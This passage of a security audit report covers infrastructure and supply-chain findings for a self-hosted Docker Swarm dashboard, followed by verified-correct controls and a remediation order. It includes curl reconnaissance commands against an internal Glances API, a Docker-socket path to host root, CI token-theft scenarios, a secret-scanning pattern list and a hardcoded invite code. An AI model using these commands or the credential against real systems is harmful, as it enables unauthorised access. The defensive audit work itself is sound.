Nothing binds a listener to `audit-reload`, and the id is absent from the `cacheElements()` list at `app.js:48-58`. Clicking it has no effect. Not a security issue; it surfaced during the sweep and is cheap to fix or delete.

---

# Infrastructure, deployment and supply chain

## INFRA-1 (High): Glances is published unauthenticated on every node, with the Docker socket mounted

**File:** `docker-compose.yml:149-169`

```yaml
  glances:
    image: nicolargo/glances:latest-full
    entrypoint: ["python3", "-m", "glances", "-w"]
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - /sys:/sys:ro
    ports:
      - target: 61208
        published: 61208
        mode: host
    deploy:
      mode: global
```

`glances -w` starts the web server with no `--username` and no `--password`. Glances only enables authentication when those are passed, so authentication is off. `mode: host` on a `global` service binds TCP/61208 on the host NIC of **every node in the Swarm**, on `0.0.0.0`, with no bind restriction.

**Attack.** Anyone with a LAN address, whether a guest on the WiFi, a compromised IoT device, or a container that can reach the host network, runs:

```
curl http://192.168.0.16:61208/api/4/processlist
curl http://192.168.0.16:61208/api/4/all
```

No credentials. Per node this yields the **full process list including argv**, the filesystem and mount table, the container inventory (through the Docker socket), network interfaces, sensors, uptime and logged-in users. The process list is the sharp edge: any operator command that ever carries a password in argv is readable while it runs, and `README.md:150` documents exactly such a command (`DB_PASS=... python scripts/unlock-user.py`).

The blast radius is wider than the Swarm. `docker-compose.yml:23` configures the standalone hosts as `zs-state-01:192.168.0.16` and `zs-store-01:192.168.0.15`, the PostgreSQL host and the NFS storage host. For their monitoring cards to work, they must be running Glances on 61208 unauthenticated as well. Those are the two machines `docs/security.md` itself calls the ones whose failure takes everything else with them.

**On what is and is not reachable, stated carefully:** the Glances 4 REST surface is read-only `GET`, and no write or exec endpoint reachable over `-w` was found. The direct impact is information disclosure, not remote code execution.

**But the socket mount is a serious amplifier.** `:ro` on a **Unix socket** bind mount makes only the inode read-only. It does not make the Docker API read-only. Any code that achieves execution inside that container, whether through a future Glances or dependency vulnerability or through a compromised `nicolargo/glances:latest-full` image (the tag floats, see INFRA-7), can drive the full read-write Docker API and create a privileged container bind-mounting the host root filesystem. That is host root, on every node, because the service is `mode: global`.

**This is the finding that most undercuts the project's own security posture.** `docs/security.md:405-414` states that the dashboard never holds a Docker socket and reads the Swarm only through a locked-down `tecnativa/docker-socket-proxy`. That is true of the `dashboard` service and materially misleading about the stack, because the same compose file hands a raw unproxied socket to a container publishing an unauthenticated HTTP server on every node's LAN interface, thirty lines below.

**Fix.** Drop `mode: host` and the published port so Glances is reachable only over the overlay by service name, or set Glances authentication and firewall 61208 to the dashboard's node. Remove the `docker.sock` mount unless the container-metrics plugin is genuinely used, and if it is, point it at a second read-only socket-proxy instance rather than the raw socket.

## INFRA-2 (Medium, arguably High depending on backend exposure): a live shared credential is hardcoded in the repository

**File:** `docker-compose.yml:63`

```yaml
      - CRIMSON_SSO_INVITE_CODE=${CRIMSON_SSO_INVITE_CODE:-zer0space}
```

This is not a placeholder. It is a defaulted live value in a public repository, and `src/crimson_sso.py:102-105` sends it as the `invite_code` to the Crimson backend's `POST /auth/register`. It is a registration credential.

**Attack.** An attacker reads the public repo, learns the invite code is `zer0space`, and if the Crimson backend's `/auth/register` is reachable from anywhere they can get to, registers arbitrary accounts on it directly. That bypasses the dashboard gateway entirely and defeats the invitation-only property for that service. The `${VAR:-default}` pattern is what makes this likely rather than theoretical: a defaulted value is precisely the kind an operator never overrides in Portainer.

**It also falsifies three claims in the documentation.** `README.md:108-109` states "No credential appears in `docker-compose.yml`, in the repository, or in any environment variable in production." `docs/security.md:374` states "Nothing in this repository contains a credential, and nothing should." `docs/security.md:426-428` claims the only password-shaped strings in the tree are `devpass` and `CHANGE-ME`. All three predate the Crimson feature and none were re-checked when it landed.

**Fix.** Remove the default (`${CRIMSON_SSO_INVITE_CODE:-}`), rotate the code on the Crimson backend, and promote it to a Swarm secret or a required stack variable. Then re-run the repository audit described in `docs/security.md:417-428` and correct the three statements above.

## INFRA-3 (Medium): a long-lived classic PAT is exposed to five mutable third-party actions, feeding a `:latest` deploy

**File:** `.github/workflows/dashboard.yml:64-87`

Three issues compound in one job. Every action is pinned to a **mutable major tag** (`actions/checkout@v4`, `docker/login-action@v3`, `docker/setup-buildx-action@v3`, `docker/build-push-action@v6`), not a commit SHA. A **classic PAT** (`secrets.CR_PAT`) sits in that job's environment; unlike `GITHUB_TOKEN` it is long-lived, coarse-grained and not scoped to this repository. And the deploy tag is `:latest`, which `docker-compose.yml:3` pulls.

**Attack.** If any one of those five actions is compromised upstream and its tag re-pointed, which has happened to popular actions before, the malicious step runs in a job holding `CR_PAT` and exfiltrates it. With that PAT the attacker pushes a backdoored image to `:latest`, and the next `docker service update --force` or node reschedule pulls it. Because the service runs at `replicas: 1` with the in-memory session store, that image sees every user's derived vault key in process memory as they sign in.

**Fix.** Pin all five actions to full commit SHAs. Replace the classic PAT with a fine-grained token scoped to package write on this one package, or fix the GHCR package permissions so `GITHUB_TOKEN` suffices and delete `CR_PAT` entirely. Deploy by digest or by the `${{ github.sha }}` tag rather than `:latest`.

## INFRA-4 (Medium): the socket proxy image carries no tag, so its deny behaviour is inherited rather than declared

**File:** `docker-compose.yml:115-129`

First, the good news, because this looks worse than it is. The comment claims "everything else explicitly off" while the list omits `SECRETS`, `CONFIGS`, `SWARM`, `EXEC`, `INFO`, `SYSTEM` and others. **The configuration is nevertheless safe:** `tecnativa/docker-socket-proxy` defaults every endpoint variable to `0` except `EVENTS`, `PING` and `VERSION`, so the four that would be catastrophic are off. Only `SERVICES`, `NODES` and `TASKS` are enabled, `POST=0`, and the proxy publishes no host port. The requested check on dangerous endpoints comes back clean.

The finding is the missing tag. `image: tecnativa/docker-socket-proxy` resolves to `:latest`. This container's entire purpose is to stand between an attacker and host root on a manager node, and its deny behaviour is **implicit**, inherited from defaults inside an image that can change under a floating tag. A future release that adds an endpoint group or changes a default alters the security posture of the Docker socket with no diff in this repository.

**Fix.** Pin to a digest, and set the dangerous variables explicitly (`SECRETS=0`, `CONFIGS=0`, `SWARM=0`, `EXEC=0`, `SYSTEM=0`, `INFO=0`, `ALLOW_RESTARTS=0`) so the deny list is enforced by this file rather than inherited. The comment already claims it is; making the claim true costs seven lines.

## INFRA-5 (Medium): the documented break-glass recovery procedure cannot work

**Files:** `Dockerfile:28-30`, `README.md:149-152`, `docs/security.md:162-167`

The Dockerfile copies only `src/`, `static/` and `templates/`. `scripts/` never reaches the image. Both documented recovery commands therefore fail:

```
docker exec -it <container> python scripts/unlock-user.py --list
```

with `No such file or directory`. The script's own docstring repeats the false claim. CI byte-compiles it, so the file exists and is valid, it just is not in the runtime image.

**Why this is not pedantry.** This is the only recovery path from a documented, reachable dead-end: `/setup` seals permanently after the first account, the manual `users.locked` flag never expires, and if the last admin is locked there is no path back in through a browser. AUTH-1 makes reaching a mass-lockout state easier, since forged addresses let an attacker trip the per-account lockout on every known username without ever hitting a per-IP limit. Discovering the recovery script is absent while locked out of an admin-only dashboard is the worst possible moment to find out.

**Fix.** Add `COPY scripts/ ./scripts/` to the Dockerfile. It is pure Python with no extra dependencies and, by design, cannot set a password.

## INFRA-6 (Medium): the workflow has no `permissions:` block while running untrusted PR code

**File:** `.github/workflows/dashboard.yml:13-33`

There is no `permissions:` block at workflow or job level, so `GITHUB_TOKEN` receives the repository default, which on older repositories is still read/write on all scopes. The `check` job runs `pip install -r requirements.txt` on the PR's own requirements file, and `requirements.txt` is in the `pull_request` paths filter, so a PR modifying it is exactly what triggers the job. `pip install` executes arbitrary code from a package's build backend, and the job then imports the PR's application code, executing every module-level statement in `src/`.

**Scoped honestly.** For a **fork** PR, GitHub force-downgrades the token to read-only and withholds secrets, so that case is contained. The workflow correctly uses `pull_request` and not `pull_request_target`, which is the single most important thing it gets right, and the `if: github.event_name != 'pull_request'` gate on the `build` job correctly keeps `CR_PAT` unreachable from any fork path. The residual risk is the same-repo branch PR: a stale collaborator token or a compromised contributor machine adds one line to `requirements.txt` pointing at an attacker-controlled sdist, and the install runs with a possibly write-capable token.

**Fix.** Add `permissions:\n  contents: read` at the top of the file. The `build` job already declares its own block and keeps it.

## INFRA-7 (Low to Medium): dependencies and base images are not actually reproducible, contrary to the stated goal

**Files:** `requirements.txt:1-3`, `Dockerfile:7`

The comment at the top of `requirements.txt` states that pinning exists "so a rebuild of the same commit produces the same image". That guarantee does not hold, for two independent reasons.

All eleven direct requirements use `==`, which is right, but **no transitive dependency is pinned**. `uvicorn[standard]==0.34.0` alone pulls `h11`, `httptools`, `websockets`, `uvloop`, `watchfiles`, `python-dotenv`, `PyYAML` and `click` at whatever resolves at build time; `fastapi==0.115.6` pulls `starlette>=0.40.0,<0.42.0`. Both `h11` and `starlette` sit directly on the request path. Separately, `FROM python:3.12-alpine` is a moving tag.

In fairness this cuts both ways: floating transitives means fresh builds pick up security fixes automatically. But that is the opposite of what the comment claims, and it means the security posture of the deployed image is not knowable from the repository.

**Fix.** Either amend the comment to describe what actually happens, or make it true with `pip-compile --generate-hashes` plus `--require-hashes`, and pin the base image by digest. The lockfile also gives you a dependency inventory to scan, which you do not currently have.

## INFRA-8 (Low): outdated pinned dependencies with published advisories, none exploitable here

Reported with an honest exploitability assessment rather than as a scanner dump. No CVE identifiers are invented.

- **`jinja2==3.1.5`.** 3.1.6 fixed CVE-2025-27516, a sandbox escape via the `|attr` filter. **Not exploitable here:** it requires rendering attacker-controlled template *source* in a `SandboxedEnvironment`, and this app renders fixed templates from `templates/` through the normal environment. I confirmed no route compiles a user-supplied string as a template. Bump it anyway to clear scanner reports.
- **`cryptography==44.0.0`.** 44.0.1 rebuilt wheels against OpenSSL 3.4.1, resolving CVE-2024-12797. **Not exploitable here:** that is a TLS raw-public-key handshake path, and this app uses the library only for AES-256-GCM and PBKDF2, never terminating TLS with it.
- **`pillow==11.1.0`.** No advisory affecting this version was confirmed, and none is asserted. Risk is low regardless: Pillow is present only as a `qrcode` backend and never parses an attacker-supplied image. Treat as "outdated, review".
- **`starlette` (transitive, `>=0.40.0,<0.42.0`)** and **`h11` (transitive, unpinned)** both have had advisories in adjacent versions. Because they are unpinned, the running image's versions cannot be determined from the repository. Another argument for INFRA-7.

## INFRA-9 (Low): `.gitignore` has no database, dump or key-file rules

The `.env` rules are correct, including the `!.env.example` un-ignore ordering. What is missing is everything else that carries credentials: `*.db`, `*.sqlite`, `*.sql`, `*.dump`, `*.pem`, `*.key`, `id_rsa*`.

The gap is specific and evidenced rather than generic. Git history contains `scripts/migrate-sqlite-to-pg.js`, which is direct evidence that a SQLite file holding **live production rows**, meaning bcrypt hashes, `vault_salt` values and AES-GCM vault ciphertext, existed in or near a working tree. A single `git add -A` during that migration would have committed the user table to a public repository, and `docs/security.md:298` states the vault's threat model is precisely a stolen database dump.

To be unambiguous: **it never happened.** Every file ever added across all refs was enumerated and no `.db`, `.sqlite`, `.pem`, `.key` or `.env` appears at any point. The guard rail that would have prevented it is simply still absent, and the migration script proves the near miss was real.

## INFRA-10 (Low): no container hardening options on any service

No service sets `read_only`, `cap_drop` or `security_opt: no-new-privileges`.

The `dashboard` service is in decent shape without them. `Dockerfile:34-35` does the important part, running as UID 10001, and the `adduser` deliberately comes after the `COPY` steps so `/app` stays root-owned and mode 755: the app can read its code but not modify it. That is the correct posture and reads as intentional.

`glances` is the outlier: no `user:` directive, upstream image runs as root, `/var/run/docker.sock` and `/sys` mounted, unauthenticated listener. That combination is why INFRA-1 escalates from a container nuisance to a host compromise.

Resource limits are present on all three services. There is no `privileged: true`, no `network_mode: host`, no `pid: host`, and no sensitive host path beyond the socket and `/sys` on Glances.

## INFRA-11 (Low): overlay networks are unencrypted and `crimson_net` is attachable

**File:** `docker-compose.yml:180-189`

Docker overlay networks are not encrypted unless created with `--opt encrypted`. `dashboard_net` has no `driver_opts`, and the documented creation command for `crimson_net` has none either. All inter-node traffic crosses the LAN as cleartext VXLAN on UDP/4789.

What that exposes to a LAN attacker with packet capture: the Docker API responses from `socketproxy` (full Swarm topology), and more sensitively the **Crimson SSO bearer tokens** that `src/crimson_sso.py` mints per user and injects into proxied requests. Those tokens are the entire point of the SSO bridge, and sniffing one impersonates that user against the Crimson backend.

`--attachable` on `crimson_net` additionally lets anyone who can run `docker run --network crimson_net` on a node speak directly to the dashboard container and the Crimson API, bypassing the gateway. That already requires Docker access on a node, so it is defence in depth rather than a standalone hole. `socketproxy` is correctly not on `crimson_net`.

## INFRA-12 (Low): `scripts/unlock-user.py` is clean, with two operational notes

The script is genuinely clean on all three of the things it is most likely to be assumed guilty of. **No SQL injection:** every statement is parameterised, and `--user` reaches asyncpg as a bound parameter. **No command injection:** no `subprocess`, no `os.system`, no `shell=True`, no `eval`; the only input surface is `argparse` with a required mutually exclusive group. **Credential handling is correct:** everything comes from `src.config`, which prefers the Swarm secret file, and the only thing printed is `describe_db_target()`, which is explicitly password free. The design decision that it cannot set a password is correct and worth preserving.

Two notes worth acting on:

- **`--all` silently clears deliberate manual locks.** Its `WHERE locked OR locked_until IS NOT NULL OR failed_attempts > 0` clause clears `users.locked`, which `docs/security.md:158-160` describes as the deliberate indefinite admin-set ban that never expires. An operator reaching for the break-glass tool during a lockout incident silently un-bans everyone who was deliberately locked out. Gate that behind `--force`.
- **No audit trail.** The script writes no audit row, so the one tool that bypasses every guard rail in the UI leaves no trace of having been used.

## INFRA-13 (Low): documentation drift on the fourth Swarm secret

`docker-compose.yml:64-70` declares four secrets, including `crimson_sso_secret`. But `README.md:100` says three and lists three, `docs/security.md:376-388` tables and creates three, and `.env.example:17` says three. An operator following the README creates three secrets, the stack then fails to converge on the missing external secret, or `CRIMSON_SSO_ENABLED` evaluates false at `src/config.py:213` and the SSO silently degrades to no per-user accounts with no error surfaced.

## INFRA-14 (Low): no `.dockerignore`

The whole working tree is uploaded as build context, including `.git/`, `docs/`, a local `.venv/` and a developer's `.env` if present.

**This is not a secret leak into the image.** The Dockerfile uses three explicit `COPY` statements and never `COPY . .`, so nothing outside `src/`, `static/`, `templates/` and `requirements.txt` reaches any layer. That was checked specifically, because a stray `COPY . .` is the usual way `.env` ends up in a published image, and it does not happen here. The cost today is build time and bandwidth, plus a latent risk if anyone ever adds a broad `COPY`.

---

# What I checked and found to be correct

Listing these matters as much as the findings, both so the work is not repeated and so nobody "fixes" something that is already right.

- **SQL injection: none found.** Every query is parameterised with `$1`-style placeholders. The one dynamic identifier, the rate-limit column in `auth._is_blocked`, is constrained by an allow list (`_COUNTABLE_COLUMNS`) that raises on anything else, and the only other interpolation is a module-level integer constant in `prune_login_attempts`.
- **Password hashing is correct.** bcrypt cost 12, input truncated to 72 bytes explicitly rather than silently, and a real dummy hash is verified on the no-such-user path so that path costs the same as a wrong password. Login responses are time-padded to a 0.4 second floor. I could not construct a username enumeration oracle.
- **Vault cryptography is correct.** PBKDF2-HMAC-SHA256 at 600k iterations with a per-user salt, AES-256-GCM with a fresh 12 byte IV per encryption, and the authentication tag is verified (a failure returns `None` and surfaces as `undecryptable` rather than as silent garbage). All of it runs in a worker thread, so a cost-12 hash or a 600k derivation cannot stall the event loop, which on a single-worker ASGI server would itself be a denial of service.
- **Vault authorization is correct.** `user_id` is in the `WHERE` clause of every vault query rather than being checked in application code, so one user cannot address another user's row by any path. I specifically looked for an IDOR here and there is not one.
- **The 2FA session boundary holds.** A pending session has no `user_id`, and `_require_session` keys off exactly that, so a pending session cannot reach any authenticated route. Session ids are regenerated on both login paths, which closes session fixation.
- **The frontend escaping primitives are sound.** `ZS_UI.esc()` escapes `&`, `<`, `>`, `"` and `'`, so it is safe in attribute context as well as text context. `ZS_UI.safeUrl()` resolves through `new URL()` and then allow-lists `http:`/`https:`, which correctly rejects `javascript:`, `data:`, case variants and embedded-whitespace variants rather than pattern matching against a deny list.
- **The admin audit view is escaped.** I traced this one specifically because `login_attempts.username` and `login_attempts.ip` are attacker controlled by an unauthenticated client and are rendered into an admin's page, which would have been a critical stored XSS chain. Both go through `esc()` in `renderAudit()`. It is log poisoning only.
- **Every JavaScript file parses cleanly** (`node --check` across `static/js/*.js`), so there is no silently broken script leaving a control unenforced.
- **Session design.** Keeping sessions in process memory rather than in the cookie or the database is the right call given the session holds the vault key, and the `replicas: 1` consequence is understood and documented rather than accidental.
- **Admin guard edge cases.** The last-admin checks on delete, demote and lock are done inside a transaction with `SELECT ... FOR UPDATE`, so two concurrent requests cannot race past them. Self-delete and self-lock are blocked.
- **Error handling does not leak internals.** The catch-all handler logs the exception and returns a generic `500`, and connection failures are converted to one exception type in `db.py` rather than being caught broadly.
- **No open redirect exists anywhere.** Every navigation in the client is a hardcoded literal. There is no `next=`, `redirect=` or `returnUrl=` parameter in the codebase, and no navigation target derives from `location.search`, `location.hash`, `document.referrer` or an API response. The only hash consumer whitelists against a fixed view list.
- **No secrets in the repository or its history.** All 24 commits across four refs (`main`, `origin/main`, `origin/feat/python-rewrite`, `origin/node-legacy-2fa`) were scanned for PEM private key headers, GitHub tokens (`ghp_`, `github_pat_`, `gho_`), AWS keys, Slack tokens, `sk-` API keys, JWTs, bcrypt hashes, Google keys, Discord webhooks and credential-bearing connection strings. Zero matches beyond the `PASSWORD` placeholder in `.env.example`. No `.env`, `.db`, `.sqlite`, `.pem` or `.key` file was ever added at any point. INFRA-2 is a defaulted credential in a tracked file, which is a different problem from a leaked one.
- **`.env.example` is genuinely a template.** Every credential-shaped variable is either commented out or an obvious placeholder. The real values present (`DB_HOST`, `DB_NAME`, `DB_USER`) are hostnames and usernames already public in the README, not secrets.
- **No CI workflow injection.** There is no `${{ github.event.* }}` interpolation anywhere, and no `${{ }}` expression inside any `run:` block. The three interpolations present are all in `with:` inputs, where they are passed as arguments rather than evaluated by a shell, and the heredoc is quoted so nothing expands inside it.
- **The workflow uses `pull_request`, not `pull_request_target`.** This is the single most important thing it gets right: fork PRs run without secrets and with a read-only token. Combined with the `github.event_name != 'pull_request'` gate on the build job, `CR_PAT` is unreachable from any fork-triggered path.
- **The socket proxy's endpoint configuration is safe.** `POST=0`, and none of `SECRETS`, `CONFIGS`, `SWARM`, `EXEC`, `CONTAINERS`, `IMAGES`, `VOLUMES` or `NETWORKS` is enabled. The four unlisted dangerous ones default to off in the upstream image. The proxy publishes no host port and is reachable only over the overlay. INFRA-4 is about the missing tag, not the endpoint list.
- **The Dockerfile is otherwise sound.** Runs as UID 10001, no secrets in any layer, no `ADD` from a remote URL, no package installs at all, no world-writable paths, a health check that deliberately does not touch PostgreSQL, and `--workers 1` consistent with the documented in-memory session invariant.
- **`localStorage` holds no secrets.** The full inventory is `zs-lang`, `zs-theme`, `zs-sidebar`, `zs-settings-tab`, `zs-chibi` and `zs-remember` (a username only). The CSRF token lives in a closure variable and is never persisted. There is no `sessionStorage` use at all, and no credential or token is ever logged to the console.
- **`target="_blank"` is fully covered.** Every instance in every template and in the JS-generated service tile carries `rel="noopener"`.

---

# Suggested remediation order

Ordered by (impact / effort), not by severity alone.

**Do this week**

1. **INFRA-2.** Rotate the Crimson invite code and remove the default from compose. It is public right now, and rotating it is minutes of work.
2. **AUTH-1, all three parts.** Fix `--forwarded-allow-ips`, then `TRUST_PROXY`, then the published port. Note that parts two and three accomplish nothing on their own while part one stands, which is the trap in this finding.
3. **CRIM-1.** Strip the identity and authorization headers in `build_request_headers` and lowercase the outbound header keys. Small, contained, and it closes the clearest privilege escalation.
4. **APP-2.** Set `COOKIE_SECURE=true`. One line, and it closes passive cookie capture on the LAN.
5. **INFRA-5.** Add `COPY scripts/ ./scripts/`. One line, and it restores the only lockout recovery path, which AUTH-1 makes easier to need.

**Do this month**

6. **INFRA-1.** Take Glances off the LAN and off the raw Docker socket. This is the largest real-world exposure in the report and it undercuts the socket-proxy design the security documentation is rightly proudest of.
7. **CRIM-3.** Switch response header relaying to an allow list.
8. **APP-1** and **APP-3.** A body size cap and `Cache-Control: no-store` on `/api/*`. Both are small middleware additions.
9. **INFRA-3, INFRA-4, INFRA-6.** Supply chain: SHA-pin the actions, digest-pin the socket proxy, add `permissions: contents: read`.

**Plan properly**

10. **CRIM-2.** Move Crimson to its own origin. This is the largest change and it needs design work, which is exactly why it should start now rather than after something goes wrong. **AUTH-4** (a vault lock step) is the cheap partial mitigation to ship in the meantime, and it shrinks the impact of APP-2 and APP-3 at the same time.
11. **INFRA-7 and INFRA-9.** Lockfile with hashes, digest-pinned base image, and the missing `.gitignore` rules.
12. Everything else in the Low and Informational sections, as ordinary maintenance.

**Documentation**

Finally, re-run the repository audit described in `docs/security.md:417-428`. It predates the Crimson feature, it missed INFRA-2, and several statements it makes are now false. The specific contradictions to reconcile are noted under AUTH-1 (the `TRUST_PROXY` guidance contradicts the LAN access guidance), INFRA-1 (the Docker socket claim), INFRA-2 (three separate "no credentials in this repository" claims), INFRA-5 (the break-glass procedure) and INFRA-13 (the fourth Swarm secret).

A closing thought worth passing on with the list: the reason this audit produced clean, specific findings rather than a wall of maybes is that the code documents its own invariants unusually well. Several findings here are literally "the comment says X, the code does Y", which is only a possible finding when someone bothered to write the comment. That is a good property and it is worth keeping as the Crimson work continues, since that is where the comment and the code have drifted apart most.
